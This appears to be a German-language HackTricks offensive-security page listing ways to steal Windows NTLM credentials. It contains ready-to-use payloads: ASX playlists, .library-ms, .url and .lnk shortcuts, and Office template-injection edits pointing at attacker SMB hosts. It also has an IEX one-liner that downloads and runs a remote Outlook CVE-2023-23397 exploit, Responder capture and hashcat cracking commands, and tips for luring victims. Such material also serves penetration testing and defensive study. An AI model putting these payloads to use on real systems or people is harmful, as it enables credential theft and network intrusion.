# Orte, um NTLM creds zu stehlen

{{#include ../../banners/hacktricks-training.md}}

**Sieh dir alle großartigen Ideen an von [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — vom Download einer microsoft word file online bis zur ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md und [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player Wiedergabelisten (.ASX/.WAX)

Wenn du ein Ziel dazu bringen kannst, eine von dir kontrollierte Windows Media Player Wiedergabeliste zu öffnen oder in der Vorschau anzuzeigen, kannst du Net‑NTLMv2 leak, indem du den Eintrag auf einen UNC path setzt. WMP versucht, das referenzierte Medium über SMB abzurufen und authentifiziert sich dabei implizit.

Beispiel-Payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Sammlung und cracking-Ablauf:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### In ZIP eingebettete .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer behandelt .library-ms-Dateien unsicher, wenn sie direkt aus einem ZIP-Archiv geöffnet werden. Wenn die Bibliotheksdefinition auf einen entfernten UNC-Pfad verweist (z. B. \\attacker\share), führt bereits das Durchsuchen/Starten der .library-ms innerhalb des ZIP dazu, dass Explorer den UNC auflistet und NTLM-Authentifizierungsdaten an den attacker sendet. Dadurch entsteht ein NetNTLMv2, das offline geknackt oder möglicherweise relayed werden kann.

Minimale .library-ms, die auf einen attacker-UNC zeigt
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Vorgehensweise
- Create the .library-ms file with the XML above (set your IP/hostname).
- Zip it (on Windows: Send to → Compressed (zipped) folder) and deliver the ZIP to the target.
- Run an NTLM capture listener and wait for the victim to open the .library-ms from inside the ZIP.


### Outlook-Kalendererinnerungs-Sound-Pfad (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows verarbeitete die erweiterte MAPI property PidLidReminderFileParameter in Calendar items. Wenn diese property auf einen UNC path verweist (z. B. \\attacker\share\alert.wav), würde Outlook beim Auslösen der Erinnerung die SMB share kontaktieren und dabei zu einem leak des Net‑NTLMv2 des Benutzers führen, ohne dass ein Klick erforderlich war. Dies wurde am 14. März 2023 gepatcht, ist aber weiterhin sehr relevant für ältere, nicht aktualisierte Flotten und für historische Incident Response.

Schnelle Ausnutzung mit PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener-Seite:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notes
- Ein Opfer muss nur Outlook for Windows laufen haben, wenn die Erinnerung ausgelöst wird.
- Der leak liefert Net‑NTLMv2, geeignet für offline cracking oder relay (nicht pass‑the‑hash).


### .LNK/.URL icon-basiertes zero‑click NTLM leak (CVE‑2025‑50154 – Umgehung von CVE‑2025‑24054)

Windows Explorer zeigt Shortcut-Icons automatisch an. Jüngste Forschung zeigte, dass selbst nach Microsofts Patch vom April 2025 für UNC‑Icon-Shortcuts weiterhin NTLM‑Authentifizierung ohne Klicks ausgelöst werden konnte, indem das Shortcut‑Ziel auf einem UNC‑Pfad gehostet und das Icon lokal belassen wurde (Patch-Umgehung mit CVE‑2025‑50154). Allein das Anzeigen des Ordners veranlasst Explorer, Metadaten vom Remote‑Ziel abzurufen und NTLM an den SMB‑Server des Angreifers zu senden.

Minimaler Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Programmverknüpfungs-Payload (.lnk) via PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Zustellungs-Ideen
- Lege die 'shortcut' in eine ZIP und bringe das Opfer dazu, sie zu öffnen.
- Platziere die 'shortcut' auf einem beschreibbaren Share, das das Opfer öffnen wird.
- Kombiniere sie mit anderen Köderdateien im selben Ordner, sodass Explorer die Elemente in der Vorschau anzeigt.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office-Dokumente können auf eine externe template verweisen. Wenn du die angehängte template auf einen UNC path setzt, authentifiziert das Öffnen des Dokuments gegenüber SMB.

Minimale DOCX relationship-Änderungen (inside word/):

1) Bearbeite word/settings.xml und füge die angehängte template-Referenz hinzu:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Bearbeite word/_rels/settings.xml.rels und weise rId1337 auf deinen UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Wieder als .docx verpacken und ausliefern. Starte deinen SMB capture listener und warte auf das Open.

Für post-capture-Ideen zum relaying oder Missbrauch von NTLM, siehe:

{{#ref}}
README.md
{{#endref}}


## Referenzen
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
